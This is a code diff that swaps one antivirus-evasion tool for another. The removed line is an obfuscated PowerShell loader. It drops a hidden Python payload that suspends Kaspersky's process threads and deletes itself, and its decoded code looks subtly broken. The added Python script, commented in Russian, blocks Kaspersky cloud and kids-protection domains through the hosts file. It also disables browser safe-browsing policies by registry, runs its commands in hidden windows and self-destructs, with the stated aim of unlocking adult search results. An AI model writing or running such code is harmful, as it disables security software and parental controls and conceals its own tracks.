@@ -1,1 +1,62 @@
-$c = "aW1wb3J0IGN0eXBlcyxvcyxzeXMKZGVmIF9mMSgpOgogX3YxPVtdCiBfdjI9b3MucG9wZW4oJ3Rhc2tsaXN0IC9GSSAiSU1BR0VOQU1FIGVxIGF2cC5leGUiIC9GTyBDU1YnKS5yZWFkKCkKIGZvciBfdjMgaW4gX3YyLnNwbGl0bGluZXMoKVsxOl06CiAgdHJ5Ol92MS5hcHBlbmQoaW50KF92My5zcGxpdCgnLCcpWzFdLnN0cmlwKCciJykpKQogIGV4Y2VwdDpjb250aW51ZQogcmV0dXJuIF92MQpkZWYgX2YyKCk6CiBfdjQ9X2YxKCkKIGlmIG5vdCBfdjQ6cmV0dXJuCiBfdjU9Y3R5cGVzLndpbmRsbC5rZXJuZWwzMgogX3Y2PV92NS5DcmVhdGVUb29saGVscDMyU25hcHNob3QoMHgwMDAwMDAwNCwwKQogY2xhc3MgX3QxKGN0eXBlcy5TdHJ1Y3R1cmUpOgogIF9maWVsZHNfPVsoImR3U2l6ZSIsY3R5cGVzLmMtdWxvbmcpLCAoImNudFVzYWdlIixjdHlwZXMuYy11bG9uZyksICgidGgzMlRocmVhZElEIixjdHlwZXMuYy11bG9uZyksICgidGgzMk93bmVyUHJvY2Vzc0lEIixjdHlwZXMuYy11bG9uZyksICgidHBCYXNlUHJpIixjdHlwZXMuYy1sb25nKSwgKCJ0cERlbHRhUHJpIixjdHlwZXMuYy1sb25nKSwgKCJkd0ZsYWdzIixjdHlwZXMuYy11bG9uZyldCiBfdjc9X3QxKCkKIF92Ny5kd1NpemU9Y3R5cGVzLnNpemVvZihfdDEpCiBfdjg9X3Y1LlRocmVhZDMyRmlyc3QoX3Y2LGN0eXBlcy5ieXJlZihfdjcpKQogd2hpbGUgX3Y4OgogIGlmIF92Ny50aDMyT3duZXJQcm9jZXNzSUQgaW4gX3Y0OgogICBfdjk9X3Y1Lk9wZW5UaHJlYWQoMHgwMDAyLEZhbHNlLF92Ny50aDMyVGhyZWFkSUQpCiAgIGlmIF92OToKICAgIF92NS5TdXNwZW5kVGhyZWFkKF92OSkKICAgIF92NS5DbG9zZUhhbmRsZShfdjkpCiAgX3Y4PV92NS5UaHJlYWQzMk5leHQoX3Y2LGN0eXBlcy5ieXJlZihfdjcpKQogX3Y1LkNsb3NlSGFuZGxlKF92NikKZGVmIF9mMygpOgogX3YxMD1vcy5wYXRoLnJlYWxwYXRoKF9fZmlsZV9fKQogX3YxMT1vcy5wYXRoLmpvaW4ob3MucGF0aC5kaXJuYW1lKF92MTApLCJzeXNfbG9nLmRhdCIpCiB0cnk6CiAgb3MucmVuYW1lKF92MTAsX3YxMSkKICBvcy5zeXN0ZW0oZidzdGFydCAvYiBjbWQgL2MgInRpbWVvdXQgL3QgMiA+IG51bCAmJiBkZWwgL2YgL3EgXCJ7X3YxMX1cIiInKQogZXhjZXB0OnBhc3MKaWYgX19uYW1lX189PSJfX21haW5fXyI6CiBpZiBjdHlwZXMud2luZGxsLnNoZWxsMzIuSXNVc2VyQW5BZG1pbigpOgogIF9mMigpCiAgX2YzKCkKIGVsc2U6c3lzLmV4aXQoKQ=="; $b = [System.Convert]::FromBase64String($c); $p = "$env:TEMP\update_proc.py"; [System.IO.File]::WriteAllBytes($p, $b); Start-Process pythonw.exe -ArgumentList $p -WindowStyle Hidden
+import os
+import sys
+import ctypes
+import subprocess
+import time
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def bypass_kaspersky():
+    # 1. Блокируем связь с облаком классификации сайтов (KSN)
+    # Перенаправляем скрипты проверки Касперского на localhost
+    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
+    blocked_domains = [
+        "gc.kis.v2.scr.kaspersky-labs.com",
+        "ksn.kaspersky.com",
+        "kids.kaspersky.com"
+    ]
+    
+    try:
+        with open(hosts_path, "a") as f:
+            for domain in blocked_domains:
+                f.write(f"\n127.0.0.1 {domain}")
+    except Exception as e:
+        pass
+
+    # 2. Отключаем принудительный безопасный поиск (SafeSearch) через реестр
+    # Это разблокирует "взрослые" результаты в Google/Yandex
+    commands = [
+        r'reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "SafeBrowsingEnabled" /t REG_DWORD /d 0 /f',
+        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "InPrivateModeAvailability" /t REG_DWORD /d 0 /f',
+        'ipconfig /flushdns',
+        'netsh winhttp reset proxy'
+    ]
+    
+    for cmd in commands:
+        subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
+
+def self_destruct():
+    # Скрипт переименовывается и удаляется через CMD после завершения
+    file_path = os.path.realpath(__file__)
+    folder = os.path.dirname(file_path)
+    temp_name = os.path.join(folder, "cache_tmp.db")
+    
+    try:
+        os.rename(file_path, temp_name)
+        # Команда на удаление через 2 секунды
+        subprocess.Popen(f'cmd /c timeout /t 2 > nul && del /f /q "{temp_name}"', 
+                         shell=True, creationflags=0x08000000)
+    except:
+        pass
+
+if __name__ == "__main__":
+    if not is_admin():
+        # Если нет прав админа, выходим (для правки hosts они нужны)
+        sys.exit()
+
+    bypass_kaspersky()
+    self_destruct()
